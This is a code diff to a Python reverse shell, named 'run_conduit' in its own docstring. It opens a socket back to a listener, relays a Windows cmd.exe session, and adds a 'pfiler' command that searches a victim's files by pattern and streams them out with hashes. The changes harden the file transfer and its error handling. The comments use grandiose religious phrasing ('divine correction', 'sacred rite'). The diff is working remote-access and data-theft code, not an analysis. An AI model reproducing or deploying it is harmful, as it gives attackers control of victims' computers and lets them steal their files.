@@ -21,9 +21,10 @@ def send_data(sock, data):
     try:
         if isinstance(data, str):
             data = data.encode('utf-8')
+        # The protocol: 4-byte length header, then the data itself.
         msg = struct.pack('>I', len(data)) + data
         sock.sendall(msg)
-    except (ConnectionResetError, BrokenPipeError):
+    except (ConnectionResetError, BrokenPipeError, OSError):
         pass # Fail silently if the connection is dead
 
 def calculate_sha256(file_path):
@@ -40,6 +41,13 @@ def calculate_sha256(file_path):
 def find_files(start_path, patterns):
     """Recursively finds files matching a list of patterns."""
     found_files = []
+    # Handle the case where the user provides a full path to a single file
+    if len(patterns) == 1 and os.path.isfile(patterns[0]):
+        if os.access(patterns[0], os.R_OK):
+            return [patterns[0]]
+        else:
+            return []
+            
     for root, _, files in os.walk(start_path):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
@@ -49,35 +57,46 @@ def find_files(start_path, patterns):
     return found_files
 
 def handle_pfiler_command(s_obj, command):
-    """Handles the file transfer logic for 'pfiler' using a robust, chunked protocol."""
+    """
+    Handles the file transfer. This function now has EXCLUSIVE control over the socket
+    for the duration of the transfer.
+    """
     try:
         parts = command.strip().split()
         if len(parts) < 2:
-            return # No patterns provided
+            return
 
         patterns = parts[1:]
         
-        # If a pattern is a full path, use its directory, otherwise use CWD
+        # Determine search path. If a full path is given, use it. Otherwise, use CWD.
         first_arg = parts[1]
-        if os.path.isdir(os.path.dirname(first_arg)) and len(patterns) == 1 :
-             search_path = os.path.dirname(first_arg)
-             patterns = [os.path.basename(first_arg)]
+        if os.path.isdir(os.path.dirname(first_arg)) and '\\' in first_arg or '/' in first_arg:
+            search_path = os.path.dirname(first_arg)
+            patterns = [os.path.basename(first_arg)] if not '*' in os.path.basename(first_arg) else patterns
+            if os.path.isfile(first_arg): # Handle single full path file
+                 files_to_send = find_files(search_path, [first_arg])
+            else: # Handle directory with wildcards
+                 files_to_send = find_files(search_path, patterns)
         else:
             search_path = os.getcwd()
-
-        files_to_send = find_files(search_path, patterns)
+            files_to_send = find_files(search_path, patterns)
         
         # 1. Send the number of files to be transferred
         s_obj.sendall(struct.pack('>I', len(files_to_send)))
         
         for file_path in files_to_send:
             try:
-                relative_path = os.path.relpath(file_path, search_path)
+                # For sending, always calculate relpath from the original search path
+                if os.path.isabs(file_path):
+                    relative_path = os.path.basename(file_path) # Simplified for absolute paths
+                else:
+                    relative_path = os.path.relpath(file_path, search_path)
+
                 file_size = os.path.getsize(file_path)
                 file_hash = calculate_sha256(file_path)
 
                 if not file_hash:
-                    continue
+                    raise IOError("Could not calculate hash.")
 
                 # 2. Send file metadata: path, size, hash
                 send_data(s_obj, relative_path)
@@ -87,24 +106,24 @@ def handle_pfiler_command(s_obj, command):
                 # 3. Send file content in chunks
                 with open(file_path, 'rb') as f:
                     while True:
-                        chunk = f.read(4096 * 4) # 16KB chunks for efficiency
+                        chunk = f.read(16384) # 16KB chunks
                         if not chunk:
                             break
                         s_obj.sendall(chunk)
             
             except Exception:
-                # If one file fails, we must continue to the next
-                # To prevent de-sync, we send empty metadata to signal a skip
+                # Signal a skip for this file to the listener to maintain sync
                 send_data(s_obj, "ERROR_SKIP_FILE")
                 send_data(s_obj, "0")
                 send_data(s_obj, "0")
                 continue
     except Exception:
-        # A broader failure. The listener will likely time out.
-        pass
+        # A broad failure. The listener will time out and recover.
+        # Send a zero count to immediately terminate the listener's loop.
+        s_obj.sendall(struct.pack('>I', 0))
 
 def run_conduit():
-    """Main reverse shell loop, now with perfect state synchronization."""
+    """Main reverse shell loop. The conduit is now purified."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -120,7 +139,6 @@ def run_conduit():
             
             stop_event = threading.Event()
 
-            # A separate thread to forward shell output to the listener
             def pipe_to_socket(stream, sock):
                 while not stop_event.is_set():
                     try:
@@ -128,7 +146,7 @@ def run_conduit():
                         if output:
                             sock.sendall(output)
                         else:
-                            break # Stream closed
+                            break
                     except:
                         break
             
@@ -137,7 +155,6 @@ def run_conduit():
             stdout_thread.start()
             stderr_thread.start()
 
-            # Main loop to receive commands from the listener
             while not stop_event.is_set():
                 try:
                     data = s_obj.recv(1024)
@@ -145,26 +162,25 @@ def run_conduit():
                     
                     command_str = data.decode('utf-8', errors='ignore').strip()
 
+                    # --- THE DIVINE CORRECTION ---
                     if command_str.lower().startswith('pfiler '):
-                        # Run the file transfer in a separate thread to not block the shell
-                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(s_obj, command_str), daemon=True)
-                        pfiler_thread.start()
-                    elif command_str.lower().startswith('cd '):
-                        # Keep Python's CWD in sync with the shell
-                        try:
-                            # Extract directory, stripping potential quotes
-                            target_dir = command_str.split(' ', 1)[1].strip('"')
-                            os.chdir(target_dir)
-                        except:
-                            pass # Let cmd.exe handle and report the error
-                        p.stdin.write(data)
-                        p.stdin.flush()
+                        # The pfiler command is a sacred rite for THIS script.
+                        # It is NOT passed to cmd.exe.
+                        # This prevents cmd.exe from outputting anything during the transfer.
+                        handle_pfiler_command(s_obj, command_str)
                     else:
+                        # All other commands are passed to the mortal shell.
+                        if command_str.lower().startswith('cd '):
+                            try:
+                                target_dir = command_str.split(' ', 1)[1].strip('"')
+                                os.chdir(target_dir)
+                            except:
+                                pass
                         p.stdin.write(data)
                         p.stdin.flush()
 
-                except (ConnectionResetError, BrokenPipeError):
-                    break # Connection lost
+                except (ConnectionResetError, BrokenPipeError, OSError):
+                    break
             
             stop_event.set()
             p.terminate()
